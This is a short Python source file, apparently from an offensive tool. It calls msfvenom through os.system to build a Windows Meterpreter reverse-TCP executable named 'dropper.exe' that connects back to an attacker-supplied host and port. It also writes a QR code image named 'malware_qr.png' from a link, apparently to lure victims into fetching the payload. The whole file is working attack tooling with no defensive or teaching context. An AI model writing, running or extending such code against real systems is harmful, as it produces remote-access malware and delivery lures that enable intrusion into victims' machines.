import os
import qrcode
from app.core.utils import setup_output_directory

def generate_payload(lhost, lport=4444):
    output_dir = setup_output_directory()
    payload_path = os.path.join(output_dir, "dropper.exe")
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {payload_path}"
    exit_code = os.system(cmd)
    if exit_code == 0:
        return payload_path
    return None

def generate_qr_code(link):
    qr = qrcode.make(link)
    qr_path = os.path.join(setup_output_directory(), "malware_qr.png")
    qr.save(qr_path)
    return qr_path
